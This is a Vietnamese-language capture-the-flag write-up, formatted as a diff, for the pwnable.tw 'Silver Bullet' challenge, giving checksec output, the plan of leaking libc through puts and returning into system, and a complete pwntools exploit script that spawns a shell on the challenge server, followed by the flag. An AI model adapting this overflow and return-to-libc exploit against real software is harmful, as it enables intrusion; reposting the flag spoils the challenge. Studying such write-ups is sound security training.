@@ -160,3 +160,111 @@ int __cdecl beat(int a1, int a2)
 
 **2. Ý tưởng**
 
+- Dùng lệnh `checksec` kiểm tra:
+
+```
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+```
+
+`NX` bật nên sẽ leak libc rồi ghi địa chỉ hàm `system` của libc sau ret.
+
+**3. Khai thác**
+
+Viết một số hàm để tiện sử dụng:
+
+```
+def create_bullet(s):
+  r.recvuntil(b'choice: ', b'1')
+  r.sendafter(b'choice: ', s)
+
+def power_up(s):
+  r.recvuntil(b'choice: ', b'2')
+  r.sendafter(b'bullet :', s)
+
+def beat():
+  r.recvuntil(b'choice: ', b'3')
+```
+
+- Để leak libc thì cần ghi đè đến địa chỉ chứa biến sức mạnh của bullet rồi gán giá trị mạnh hơn 0x7FFFFFFF. Để làm được việc này thì dùng hàm `create_bullet` và hàm `power_up` để ghi đè đến `ret`
+
+```
+create_bullet(b'a'*0x2f)
+power_up(b'a')
+payload = b'a'*7 + p32(exe.plt['puts']) + p32(exe.sym['main']) + p32(exe.got['puts'])
+power_up(payload)
+beat()
+beat()
+r.recvuntil(b'You win !!\n')
+puts_leak = u32(r.recv(4))
+log.info("puts leak: " + hex(puts_leak))
+libc.address = puts_leak - 0x73260
+log.info("libc base: " + hex(libc.address))
+```
+
+Tiếp theo chèn chèn shell là xong.
+
+```
+pop_ebx = 0x08048475
+create_bullet(b'a'*0x2f)
+power_up(b'a')
+payload = b'a'*7 + p32(libc.sym['system']) + p32(pop_ebx)
+payload += p32(libc.address + 0x158e8b)
+power_up(payload)
+beat()
+beat()
+```
+
+Ta có script như sau:
+
+```
+from pwn import *
+
+exe = ELF('silver_bullet', checksec=False)
+#r = process(exe.path)
+r = remote('chall.pwnable.tw', 10103)
+libc = ELF('libc_32.so.6', checksec=False)
+
+def create_bullet(s):
+  r.sendafter(b'choice :', b'1')
+  r.sendafter(b'bullet :', s)
+
+def power_up(s):
+  r.sendafter(b'choice :', b'2')
+  r.sendafter(b'bullet :', s)
+
+def beat():
+  r.sendafter(b'choice :', b'3')
+
+#input()
+create_bullet(b'a'*0x2f)
+power_up(b'a')
+payload = b'a'*7 + p32(exe.plt['puts']) + p32(exe.sym['main']) + p32(exe.got['puts'])
+power_up(payload)
+beat()
+beat()
+r.recvuntil(b'You win !!\n')
+puts_leak = u32(r.recv(4))
+log.info("puts leak: " + hex(puts_leak))
+libc.address = puts_leak - libc.sym['puts']
+log.info("libc base: " + hex(libc.address))
+
+pop_ebx = 0x08048475
+create_bullet(b'a'*0x2f)
+power_up(b'a')
+payload = b'a'*7 + p32(libc.sym['system']) + p32(pop_ebx)
+payload += p32(libc.address + 0x158e8b)
+power_up(payload)
+beat()
+beat()
+r.interactive()
+```
+
+**4. Lấy flag**
+
+![flag.png](photo/flag.png)
+
+`FLAG{uS1ng_S1lv3r_bu1l3t_7o_Pwn_th3_w0rld}`
